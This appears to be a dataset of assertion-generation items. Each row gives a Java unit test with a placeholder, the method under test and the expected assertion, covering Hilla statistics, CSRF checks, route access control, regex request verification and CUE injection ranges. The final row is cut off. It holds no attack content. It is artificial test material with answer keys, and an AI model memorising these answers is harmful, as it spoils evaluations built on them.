"when_routeRegistryIsEmpty_and_hasHillaFsRouteIsTrue_hasHybridRouting_isNotReported() { try (MockedStatic<Platform> mockedStaticPlatform = mockStatic( Platform.class)) { mockedStaticPlatform.when(Platform::getHillaVersion) .thenReturn(Optional.of(""24.4.0""));  DeploymentConfiguration deploymentConfiguration = Mockito .mock(DeploymentConfiguration.class); when(deploymentConfiguration.getFrontendFolder()) .thenReturn(frontendFolder.getRoot()); when(deploymentConfiguration.isReactEnabled()).thenReturn(false); var vaadinService = Mockito.mock(VaadinService.class); when(vaadinService.getDeploymentConfiguration()) .thenReturn(deploymentConfiguration);  var router = Mockito.mock(Router.class); when(vaadinService.getRouter()).thenReturn(router); var routeRegistry = Mockito.mock(RouteRegistry.class); when(router.getRegistry()).thenReturn(routeRegistry); when(routeRegistry.getRegisteredRoutes()) .thenReturn(Collections.emptyList());  HillaStats.reportGenericHasFeatures(vaadinService, true); Map<String, String> entries = getEntries(); ""<AssertPlaceHolder>""; } }
reportGenericHasFeatures(VaadinService service, boolean hasHillaFsRoute) { var deploymentConfiguration = service.getDeploymentConfiguration(); var hillaVersion = getHillaVersion(); reportHasReactAndLit(deploymentConfiguration, hillaVersion); reportHasRouter(service, hasHillaFsRoute, hillaVersion); }"	"assertNull(""entries: "" + entries, entries.get(HAS_HYBRID_ROUTING))"
"when_reportHasEndpoint_isCalled_hasEndpoint_isReported() { try (MockedStatic<Platform> mockedStaticPlatform = mockStatic( Platform.class)) { mockedStaticPlatform.when(Platform::getHillaVersion) .thenReturn(Optional.of(""24.4.0"")); HillaStats.reportHasEndpoint(); var entries = getEntries(); ""<AssertPlaceHolder>""; } }
reportHasEndpoint() { try { UsageStatistics.markAsUsed(HAS_ENDPOINT, getHillaVersion()); } catch (Throwable e) { LOGGER.debug(""Failed to report Hilla statistics"", e); } }"	"assertEquals(""entries: "" + entries, ""24.4.0"", entries.get(HAS_ENDPOINT))"
"when_reportEndpointActive_isCalled_endpointActive_isReported() { try (MockedStatic<Platform> mockedStaticPlatform = mockStatic( Platform.class)) { mockedStaticPlatform.when(Platform::getHillaVersion) .thenReturn(Optional.of(""24.4.0"")); HillaStats.reportEndpointActive(); var entries = getEntries(); ""<AssertPlaceHolder>""; } }
reportEndpointActive() { try { UsageStatistics.markAsUsed(ENDPOINT_ACTIVE, getHillaVersion()); } catch (Throwable e) { LOGGER.debug(""Failed to report Hilla statistics"", e); } }"	"assertEquals(""entries: "" + entries, ""24.4.0"", entries.get(ENDPOINT_ACTIVE))"
"should_enableCsrf_When_CreatingCsrfCheckerAndXsrfProtectionEnabled() { Assert.""<AssertPlaceHolder>""; }
isCsrfProtectionEnabled() { return csrfProtectionEnabled; }"	assertTrue(csrfChecker.isCsrfProtectionEnabled())
"should_notEnableCsrf_When_CreatingCsrfCheckerAndXsrfProtectionDisabled() { Mockito.when(appConfig.isXsrfProtectionEnabled()).thenReturn(false); csrfChecker = Mockito.spy(new CsrfChecker(servletContext));  Assert.""<AssertPlaceHolder>""; }
isCsrfProtectionEnabled() { return csrfProtectionEnabled; }"	assertFalse(csrfChecker.isCsrfProtectionEnabled())
"uuid_fromTransferType() { String s = ""0000001c-aa10-ce03-0001-3f716513b90d""; UUID u = endpointTransferMapper.toEndpointType(s, UUID.class); Assert.""<AssertPlaceHolder>""; }
toEndpointType(Object transferValue, Class<T> endpointType) { if (transferValue == null) { return null; }  Mapper mapper = getMapper(endpointType); if (mapper == null) { return (T) transferValue; }  getLogger().debug(""Mapping from transfer type ("" + transferValue.getClass().getName() + "") to endpoint type ("" + endpointType.getName() + "")"");  return (T) mapper.toEndpointType(transferValue); }"	"assertEquals(""0000001c-aa10-ce03-0001-3f716513b90d"", u.toString())"
"page_fromTransferType() { List<String> incoming = new ArrayList<>(); incoming.add(""First""); incoming.add(""Second""); Page p = endpointTransferMapper.toEndpointType(incoming, Page.class); Assert.""<AssertPlaceHolder>""; }
toEndpointType(Object transferValue, Class<T> endpointType) { if (transferValue == null) { return null; }  Mapper mapper = getMapper(endpointType); if (mapper == null) { return (T) transferValue; }  getLogger().debug(""Mapping from transfer type ("" + transferValue.getClass().getName() + "") to endpoint type ("" + endpointType.getName() + "")"");  return (T) mapper.toEndpointType(transferValue); }"	assertEquals(incoming, p.getContent())
"test_role_allowed() { MockHttpServletRequest request = new MockHttpServletRequest(); request.setRequestURI(""/context/test""); request.setContextPath(""/context""); request.addUserRole(""ROLE_ADMIN"");  AvailableViewInfo config = new AvailableViewInfo(""Test"", new String[] { ""ROLE_ADMIN"" }, false, ""/test"", false, false, null, null, null); routeUtil.setRoutes(Collections.singletonMap(""/test"", config));  Assert.""<AssertPlaceHolder>""; }
isRouteAllowed(HttpServletRequest request) { if (registeredRoutes == null) { collectClientRoutes(request); }  var viewConfig = getRouteData(request);  return viewConfig.isPresent(); }"	"assertTrue(""Route should be allowed for ADMIN role."", routeUtil.isRouteAllowed(request))"
"test_role_not_allowed() { MockHttpServletRequest request = new MockHttpServletRequest(); request.setRequestURI(""/context/test""); request.setContextPath(""/context""); request.addUserRole(""ROLE_USER"");  AvailableViewInfo config = new AvailableViewInfo(""Test"", new String[] { ""ROLE_ADMIN"" }, false, ""/test"", false, false, null, null, null); routeUtil.setRoutes(Collections.singletonMap(""/test"", config));  Assert.""<AssertPlaceHolder>""; }
isRouteAllowed(HttpServletRequest request) { if (registeredRoutes == null) { collectClientRoutes(request); }  var viewConfig = getRouteData(request);  return viewConfig.isPresent(); }"	"assertFalse(""USER role should not allow ADMIN route."", routeUtil.isRouteAllowed(request))"
"test_login_required() { MockHttpServletRequest request = new MockHttpServletRequest(); request.setRequestURI(""/context/test""); request.setContextPath(""/context""); request.setUserPrincipal(Mockito.mock(Principal.class));  AvailableViewInfo config = new AvailableViewInfo(""Test"", null, true, ""/test"", false, false, null, null, null); routeUtil.setRoutes(Collections.singletonMap(""/test"", config));  Assert.""<AssertPlaceHolder>""; }
isRouteAllowed(HttpServletRequest request) { if (registeredRoutes == null) { collectClientRoutes(request); }  var viewConfig = getRouteData(request);  return viewConfig.isPresent(); }"	"assertTrue(""Request with user principal should be allowed"", routeUtil.isRouteAllowed(request))"
"test_login_required_failed() { MockHttpServletRequest request = new MockHttpServletRequest(); request.setRequestURI(""/context/test""); request.setContextPath(""/context""); request.setUserPrincipal(null);  AvailableViewInfo config = new AvailableViewInfo(""Test"", null, true, ""/test"", false, false, null, null, null); routeUtil.setRoutes(Collections.singletonMap(""/test"", config));  Assert.""<AssertPlaceHolder>""; }
isRouteAllowed(HttpServletRequest request) { if (registeredRoutes == null) { collectClientRoutes(request); }  var viewConfig = getRouteData(request);  return viewConfig.isPresent(); }"	"assertFalse(""No login should be denied access"", routeUtil.isRouteAllowed(request))"
"test_login_required_on_layout() { MockHttpServletRequest request = new MockHttpServletRequest(); request.setRequestURI(""/context/test""); request.setContextPath(""/context""); request.setUserPrincipal(null);  AvailableViewInfo pageWithoutLogin = new AvailableViewInfo(""Test Page"", null, false, ""/test"", false, false, null, null, null);  AvailableViewInfo layoutWithLogin = new AvailableViewInfo(""Test Layout"", null, true, """", false, false, null, Collections.singletonList(pageWithoutLogin), null); routeUtil.setRoutes(Map.ofEntries(entry(""/test"", pageWithoutLogin), entry("""", layoutWithLogin)));  Assert.""<AssertPlaceHolder>""; }
isRouteAllowed(HttpServletRequest request) { if (registeredRoutes == null) { collectClientRoutes(request); }  var viewConfig = getRouteData(request);  return viewConfig.isPresent(); }"	"assertFalse( ""Access should be denied for layout with login required"", routeUtil.isRouteAllowed(request))"
"test_login_required_on_page() { MockHttpServletRequest request = new MockHttpServletRequest(); request.setRequestURI(""/context/test""); request.setContextPath(""/context""); request.setUserPrincipal(null);  AvailableViewInfo pageWithLogin = new AvailableViewInfo(""Test Page"", null, true, ""/test"", false, false, null, null, null);  AvailableViewInfo layoutWithoutLogin = new AvailableViewInfo( ""Test Layout"", null, false, """", false, false, null, Collections.singletonList(pageWithLogin), null); routeUtil.setRoutes(Map.ofEntries(entry(""/test"", pageWithLogin), entry("""", layoutWithoutLogin)));  Assert.""<AssertPlaceHolder>""; }
isRouteAllowed(HttpServletRequest request) { if (registeredRoutes == null) { collectClientRoutes(request); }  var viewConfig = getRouteData(request);  return viewConfig.isPresent(); }"	"assertFalse(""Access should be denied for page requiring login"", routeUtil.isRouteAllowed(request))"
"test_login_not_required_on_root() { MockHttpServletRequest request = new MockHttpServletRequest(); request.setRequestURI(""/context/""); request.setContextPath(""/context""); request.setUserPrincipal(null);  AvailableViewInfo config = new AvailableViewInfo(""Root"", null, false, """", false, false, null, null, null); routeUtil.setRoutes(Collections.singletonMap("""", config));  Assert.""<AssertPlaceHolder>""; }
isRouteAllowed(HttpServletRequest request) { if (registeredRoutes == null) { collectClientRoutes(request); }  var viewConfig = getRouteData(request);  return viewConfig.isPresent(); }"	"assertTrue(""Login no required should allow access"", routeUtil.isRouteAllowed(request))"
"should_not_addRouteIndexHtmlRequestListener_when_react_is_not_enabled() { Mockito.when(mockDeploymentConfiguration.isReactEnabled()) .thenReturn(false);  routeUnifyingServiceInitListener.serviceInit(event); Assert.""<AssertPlaceHolder>""; }
serviceInit(ServiceInitEvent event) { var deploymentConfiguration = event.getSource() .getDeploymentConfiguration(); LOGGER.debug(""deploymentConfiguration.isReactEnabled() = {}"", deploymentConfiguration.isReactEnabled()); boolean hasHillaFsRoute = false; if (deploymentConfiguration.isReactEnabled()) { var routeUnifyingIndexHtmlRequestListener = new RouteUnifyingIndexHtmlRequestListener( deploymentConfiguration, accessControl, viewAccessChecker, routeUnifyingConfigurationProperties .isExposeServerRoutesToClient()); var deploymentMode = deploymentConfiguration.isProductionMode() ? ""PRODUCTION"" : ""DEVELOPMENT""; event.addIndexHtmlRequestListener( routeUnifyingIndexHtmlRequestListener); LOGGER.debug( ""{} mode: Registered RouteUnifyingIndexHtmlRequestListener."", deploymentMode);  Map<String, AvailableViewInfo> clientMenus = MenuRegistry .collectClientMenuItems(false, deploymentConfiguration, null);  hasHillaFsRoute = !clientMenus.isEmpty(); } HillaStats.reportGenericHasFeatures(event.getSource(), hasHillaFsRoute); }"	"assertFalse( ""RouteIndexHtmlRequestListener added unexpectedly when React is not enabled"", hasRouteUnifyingIndexHtmlRequestListenerAdded(event))"
"should_registerClientRoutes_when_in_prodMode_and_react_is_enabled() { Mockito.when(mockDeploymentConfiguration.isReactEnabled()) .thenReturn(true); Mockito.when(mockDeploymentConfiguration.isProductionMode()) .thenReturn(true);  routeUnifyingServiceInitListener.serviceInit(event); Assert.""<AssertPlaceHolder>""; }
serviceInit(ServiceInitEvent event) { var deploymentConfiguration = event.getSource() .getDeploymentConfiguration(); LOGGER.debug(""deploymentConfiguration.isReactEnabled() = {}"", deploymentConfiguration.isReactEnabled()); boolean hasHillaFsRoute = false; if (deploymentConfiguration.isReactEnabled()) { var routeUnifyingIndexHtmlRequestListener = new RouteUnifyingIndexHtmlRequestListener( deploymentConfiguration, accessControl, viewAccessChecker, routeUnifyingConfigurationProperties .isExposeServerRoutesToClient()); var deploymentMode = deploymentConfiguration.isProductionMode() ? ""PRODUCTION"" : ""DEVELOPMENT""; event.addIndexHtmlRequestListener( routeUnifyingIndexHtmlRequestListener); LOGGER.debug( ""{} mode: Registered RouteUnifyingIndexHtmlRequestListener."", deploymentMode);  Map<String, AvailableViewInfo> clientMenus = MenuRegistry .collectClientMenuItems(false, deploymentConfiguration, null);  hasHillaFsRoute = !clientMenus.isEmpty(); } HillaStats.reportGenericHasFeatures(event.getSource(), hasHillaFsRoute); }"	"assertTrue( ""RouteUnifyingIndexHtmlRequestListener was not registered"", event.getAddedIndexHtmlRequestListeners().anyMatch( indexHtmlRequestListener -> indexHtmlRequestListener instanceof RouteUnifyingIndexHtmlRequestListener))"
"should_registerClientRoutes_when_in_devMode_and_react_is_enabled() { Mockito.when(mockDeploymentConfiguration.isReactEnabled()) .thenReturn(true); Mockito.when(mockDeploymentConfiguration.isProductionMode()) .thenReturn(false); routeUnifyingServiceInitListener.serviceInit(event); Assert.""<AssertPlaceHolder>""; }
serviceInit(ServiceInitEvent event) { var deploymentConfiguration = event.getSource() .getDeploymentConfiguration(); LOGGER.debug(""deploymentConfiguration.isReactEnabled() = {}"", deploymentConfiguration.isReactEnabled()); boolean hasHillaFsRoute = false; if (deploymentConfiguration.isReactEnabled()) { var routeUnifyingIndexHtmlRequestListener = new RouteUnifyingIndexHtmlRequestListener( deploymentConfiguration, accessControl, viewAccessChecker, routeUnifyingConfigurationProperties .isExposeServerRoutesToClient()); var deploymentMode = deploymentConfiguration.isProductionMode() ? ""PRODUCTION"" : ""DEVELOPMENT""; event.addIndexHtmlRequestListener( routeUnifyingIndexHtmlRequestListener); LOGGER.debug( ""{} mode: Registered RouteUnifyingIndexHtmlRequestListener."", deploymentMode);  Map<String, AvailableViewInfo> clientMenus = MenuRegistry .collectClientMenuItems(false, deploymentConfiguration, null);  hasHillaFsRoute = !clientMenus.isEmpty(); } HillaStats.reportGenericHasFeatures(event.getSource(), hasHillaFsRoute); }"	"assertTrue( ""RouteUnifyingIndexHtmlRequestListener was not registered"", event.getAddedIndexHtmlRequestListeners().anyMatch( indexHtmlRequestListener -> indexHtmlRequestListener instanceof RouteUnifyingIndexHtmlRequestListener))"
"when_hillaIsUsed_and_reactIsDisabled_LitIsReported() { Mockito.when(mockDeploymentConfiguration.isReactEnabled()) .thenReturn(false); Mockito.when(mockDeploymentConfiguration.isProductionMode()) .thenReturn(false);  try (MockedStatic<FrontendUtils> mockedStaticFrontendUtils = mockStatic( FrontendUtils.class)) { mockedStaticFrontendUtils .when(() -> FrontendUtils.isHillaUsed(Mockito.any())) .thenReturn(true); routeUnifyingServiceInitListener.serviceInit(event); boolean litReported = UsageStatistics.getEntries() .anyMatch(entry -> ""has-lit"".equals(entry.getName())); Assert.""<AssertPlaceHolder>""; } }
serviceInit(ServiceInitEvent event) { var deploymentConfiguration = event.getSource() .getDeploymentConfiguration(); LOGGER.debug(""deploymentConfiguration.isReactEnabled() = {}"", deploymentConfiguration.isReactEnabled()); boolean hasHillaFsRoute = false; if (deploymentConfiguration.isReactEnabled()) { var routeUnifyingIndexHtmlRequestListener = new RouteUnifyingIndexHtmlRequestListener( deploymentConfiguration, accessControl, viewAccessChecker, routeUnifyingConfigurationProperties .isExposeServerRoutesToClient()); var deploymentMode = deploymentConfiguration.isProductionMode() ? ""PRODUCTION"" : ""DEVELOPMENT""; event.addIndexHtmlRequestListener( routeUnifyingIndexHtmlRequestListener); LOGGER.debug( ""{} mode: Registered RouteUnifyingIndexHtmlRequestListener."", deploymentMode);  Map<String, AvailableViewInfo> clientMenus = MenuRegistry .collectClientMenuItems(false, deploymentConfiguration, null);  hasHillaFsRoute = !clientMenus.isEmpty(); } HillaStats.reportGenericHasFeatures(event.getSource(), hasHillaFsRoute); }"	"assertTrue( ""Expected Lit to be reported in usage stats when 'isReactEnabled=false' and Hilla is used"", litReported)"
"testVerifyRequestEmptyRequest() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); Context context = new Context<>(subject, null, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertTrue(flag)
"testVerifyRequestRequestWithSomeData() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", ""25""); Context context = new Context<>(subject, null, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertTrue(flag)
"testVerifyRequestRequestWithNoDataAndRuleMisMatch() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""verify_aal"", ""25""); Context context = new Context<>(subject, null, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertFalse(flag)
"testVerifyRequestRequestWithNullDataAndRuleMisMatch() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", null); subject.put(""verify_aal"", ""25""); Context context = new Context<>(subject, null, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertFalse(flag)
"testVerifyRequestRequestWithEmptyDataAndRuleMisMatch() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", """"); subject.put(""verify_aal"", ""25""); Context context = new Context<>(subject, null, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertFalse(flag)
"testVerifyRequestRequestWithSomeDataAndNullRule() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", ""25""); subject.put(""verify_aal"", null); Context context = new Context<>(subject, null, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertTrue(flag)
"testVerifyRequestRequestWithSomeDataAndEmptyRule() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", ""25""); subject.put(""verify_aal"", """"); Context context = new Context<>(subject, null, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertTrue(flag)
"testVerifyRequestRequestWithSomeDataAndRuleMatch() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", ""25""); subject.put(""verify_aal"", ""25""); Context context = new Context<>(subject, null, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertTrue(flag)
"testVerifyRequestRequestWithSomeDataAndRuleMismatch() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", ""25""); subject.put(""verify_aal"", ""26""); Context context = new Context<>(subject, null, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertFalse(flag)
"testVerifyRequestRequestWithSomeDataAndRuleRegexMatch() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", ""25""); subject.put(""verify_aal"", ""2.""); Context context = new Context<>(subject, null, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertTrue(flag)
"testVerifyRequestRequestWithSomeDataAndRuleRegexMisMatch() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", ""35""); subject.put(""verify_aal"", ""2?""); Context context = new Context<>(subject, null, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertFalse(flag)
"testVerifyRequestRequestWithSomeDataAndRuleRegexMatch2() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", ""25""); subject.put(""verify_aal"", ""2.""); subject.put(""userId"", ""123456""); subject.put(""verify_userId"", ""12345[6|7]""); Context context = new Context<>(subject, null, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertTrue(flag)
"testVerifyRequestRequestWithSomeDataAndRuleRegexMisMatch2() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", ""25""); subject.put(""verify_aal"", ""2.""); subject.put(""userId"", ""123458""); subject.put(""verify_userId"", ""12345[6|7]""); Context context = new Context<>(subject, null, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertFalse(flag)
"testVerifyRequestRequestWithSomeDataAndRuleRegexMatch2WithSubjectAndResource() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", ""25""); subject.put(""verify_aal"", ""2.""); subject.put(""userId"", ""123457""); subject.put(""verify_userId"", ""12345[6|7]"");  Map<String, String> resource = new HashMap<>(); resource.put(""aal"", ""10""); resource.put(""verify_aal"", "".0""); resource.put(""userId"", ""1111""); resource.put(""verify_userId"", ""1111""); Context context = new Context<>(subject, resource, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertTrue(flag)
"testVerifyRequestRequestWithSomeDataAndRuleRegexMisMatch2WithSubjectAndResource() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", ""25""); subject.put(""verify_aal"", ""2.""); subject.put(""userId"", ""123457""); subject.put(""verify_userId"", ""12345[6|7]"");  Map<String, String> resource = new HashMap<>(); resource.put(""aal"", ""10""); resource.put(""verify_aal"", "".0""); resource.put(""userId"", ""1111""); resource.put(""verify_userId"", ""12345[6|7]""); Context context = new Context<>(subject, resource, null, null, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertFalse(flag)
"testVerifyRequestRequestWithSomeDataAndRuleRegexMatch2WithSubjectAndResourceAndActionAndEnvironment() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", ""25""); subject.put(""verify_aal"", ""2.""); subject.put(""userId"", ""123457""); subject.put(""verify_userId"", ""12345[6|7]"");  Map<String, String> resource = new HashMap<>(); resource.put(""aal"", ""10""); resource.put(""verify_aal"", "".0""); resource.put(""userId"", ""1111""); resource.put(""verify_userId"", ""1111"");  Map<String, String> action = new HashMap<>(); resource.put(""aal"", ""abcd""); resource.put(""verify_aal"", ""[a][b][c][d]""); resource.put(""userId"", ""1111""); resource.put(""verify_userId"", ""1111"");  Map<String, String> environment = new HashMap<>(); resource.put(""aal"", ""abcd""); resource.put(""verify_aal"", ""[a-z]*""); resource.put(""userId"", ""1111""); resource.put(""verify_userId"", ""1111""); Context context = new Context<>(subject, resource, action, environment, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertTrue(flag)
"testVerifyRequestRequestWithSomeDataAndRuleRegexMisMatch2WithSubjectAndResourceAndActionAndEnvironment() { Response response = new Response(); Map<String, String> subject = new HashMap<>(); subject.put(""aal"", ""25""); subject.put(""verify_aal"", ""2.""); subject.put(""userId"", ""123457""); subject.put(""verify_userId"", ""12345[6|7]"");  Map<String, String> resource = new HashMap<>(); resource.put(""aal"", ""10""); resource.put(""verify_aal"", "".0""); resource.put(""userId"", ""1111""); resource.put(""verify_userId"", ""1111"");  Map<String, String> action = new HashMap<>(); resource.put(""aal"", ""abcd""); resource.put(""verify_aal"", ""[a][b][c][d]""); resource.put(""userId"", ""1111""); resource.put(""verify_userId"", ""1111"");  Map<String, String> environment = new HashMap<>(); resource.put(""aal"", ""abcd""); resource.put(""verify_aal"", ""[a-z]*""); resource.put(""userId"", ""1111""); resource.put(""verify_userId"", ""111""); Context context = new Context<>(subject, resource, action, environment, null, response, null, null);  boolean flag = context.verifyRequest();  Assert.""<AssertPlaceHolder>""; }
verifyRequest(){ return verifyRequest(subject) && verifyRequest(resource) && verifyRequest(action) && verifyRequest(environment); }"	assertFalse(flag)
"singleRange() { createCueFile(""'cont<caret>ent'""); var literal = findTypedElement(CueSimpleBytesLit.class); var ranges = CueMultiHostInjector.findInjectionRanges(literal); ""<AssertPlaceHolder>""; }
findInjectionRanges(CueStringLiteral context) { var totalRange = context.getLiteralContentRange(); var interpolations = context.getInterpolationList() .stream() .map(PsiElement::getTextRangeInParent) .sorted(Comparator.comparingInt(TextRange::getStartOffset)) .collect(Collectors.toList());  if (interpolations.isEmpty()) { return Collections.singletonList(new InjectionData(totalRange, null, null)); }  var hostText = context.getText(); var result = new LinkedList<InjectionData>(); var lastStart = totalRange.getStartOffset(); var lastEnd = totalRange.getStartOffset(); for (TextRange range : interpolations) { var start = range.getStartOffset(); var end = range.getEndOffset(); if (start == totalRange.getStartOffset()) { // interpolation at start, insert empty range before to allow editing result.add(new InjectionData(TextRange.create(start, start), null, null)); } else if (start > lastEnd) { var prefix = lastEnd > lastStart ? hostText.substring(lastStart, lastEnd) : null; result.add(new InjectionData(TextRange.create(lastEnd, start), prefix, null)); } lastStart = start; lastEnd = end; } if (lastEnd < totalRange.getEndOffset()) { var prefix = lastEnd > lastStart ? hostText.substring(lastStart, lastEnd) : null; result.add(new InjectionData(TextRange.create(lastEnd, totalRange.getEndOffset()), prefix, null)); } else if (lastEnd == totalRange.getEndOffset() && lastEnd > lastStart) { var prefix = hostText.substring(lastStart, lastEnd); result.add(new InjectionData(TextRange.create(lastEnd, totalRange.getEndOffset()), prefix, null)); } return result; }"	assertEquals(Collections.singletonList(new InjectionData(TextRange.create(1, 8), null, null)), ranges)
"interpolationMiddle() { createCueFile(""'a\\(123)b'""); var literal = findTypedElement(CueStringLiteral.class); var ranges = CueMultiHostInjector.findInjectionRanges(literal);  var expected = Arrays.asList( new InjectionData(TextRange.create(1, 2), null, null), new InjectionData(TextRange.create(8, 9), ""\\(123)"", null)); ""<AssertPlaceHolder>""; }
findInjectionRanges(CueStringLiteral context) { var totalRange = context.getLiteralContentRange(); var interpolations = context.getInterpolationList() .stream() .map(PsiElement::getTextRangeInParent) .sorted(Comparator.comparingInt(TextRange::getStartOffset)) .collect(Collectors.toList());  if (interpolations.isEmpty()) { return Collections.singletonList(new InjectionData(totalRange, null, null)); }  var hostText = context.getText(); var result = new LinkedList<InjectionData>(); var lastStart = totalRange.getStartOffset(); var lastEnd = totalRange.getStartOffset(); for (TextRange range : interpolations) { var start = range.getStartOffset(); var end = range.getEndOffset(); if (start == totalRange.getStartOffset()) { // interpolation at start, insert empty range before to allow editing result.add(new InjectionData(TextRange.create(start, start), null, null)); } else if (start > lastEnd) { var prefix = lastEnd > lastStart ? hostText.substring(lastStart, lastEnd) : null; result.add(new InjectionData(TextRange.create(lastEnd, start), prefix, null)); } lastStart = start; lastEnd = end; } if (lastEnd < totalRange.getEndOffset()) { var prefix = lastEnd > lastStart ? hostText.substring(lastStart, lastEnd) : null; result.add(new InjectionData(TextRange.create(lastEnd, totalRange.getEndOffset()), prefix, null)); } else if (lastEnd == totalRange.getEndOffset() && lastEnd > lastStart) { var prefix = hostText.substring(lastStart, lastEnd); result.add(new InjectionData(TextRange.create(lastEnd, totalRange.getEndOffset()), prefix, null)); } return result; }"	assertEquals(expected, ranges)
"interpolationFirst() { createCueFile(""'\\(123)b'""); var literal = findTypedElement(CueStringLiteral.class); var ranges = CueMultiHostInjector.findInjectionRanges(literal);  var expected = Arrays.asList( new InjectionData(TextRange.create(1, 1), null, null), new InjectionData(TextRange.create(7, 8), ""\\(123)"", null)); ""<AssertPlaceHolder>""; }
findInjectionRanges(CueStringLiteral context) { var totalRange = context.getLiteralContentRange(); var interpolations = context.getInterpolationList() .stream() .map(PsiElement::getTextRangeInParent) .sorted(Comparator.comparingInt(TextRange::getStartOffset)) .collect(Collectors.toList());  if (interpolations.isEmpty()) { return Collections.singletonList(new InjectionData(totalRange, null, null)); }  var hostText = context.getText(); var result = new LinkedList<InjectionData>(); var lastStart = totalRange.getStartOffset(); var lastEnd = totalRange.getStartOffset(); for (TextRange range : interpolations) { var start = range.getStartOffset(); var end = range.getEndOffset(); if (start == totalRange.getStartOffset()) { // interpolation at start, insert empty range before to allow editing result.add(new InjectionData(TextRange.create(start, start), null, null)); } else if (start > lastEnd) { var prefix = lastEnd > lastStart ? hostText.substring(lastStart, lastEnd) : null; result.add(new InjectionData(TextRange.create(lastEnd, start), prefix, null)); } lastStart = start; lastEnd = end; } if (lastEnd < totalRange.getEndOffset()) { var prefix = lastEnd > lastStart ? hostText.substring(lastStart, lastEnd) : null; result.add(new InjectionData(TextRange.create(lastEnd, totalRange.getEndOffset()), prefix, null)); } else if (lastEnd == totalRange.getEndOffset() && lastEnd > lastStart) { var prefix = hostText.substring(lastStart, lastEnd); result.add(new InjectionData(TextRange.create(lastEnd, totalRange.getEndOffset()), prefix, null)); } return result; }"	assertEquals(expected, ranges)
"interpolationEnd() { createCueFile(""'a\\(123)'""); var literal = findTypedElement(CueStringLiteral.class); var ranges = CueMultiHostInjector.findInjectionRanges(literal);  var expected = Arrays.asList( new InjectionData(TextRange.create(1, 2), null, null), new InjectionData(TextRange.create(8, 8), ""\\(123)"", null)); ""<AssertPlaceHolder>""; }
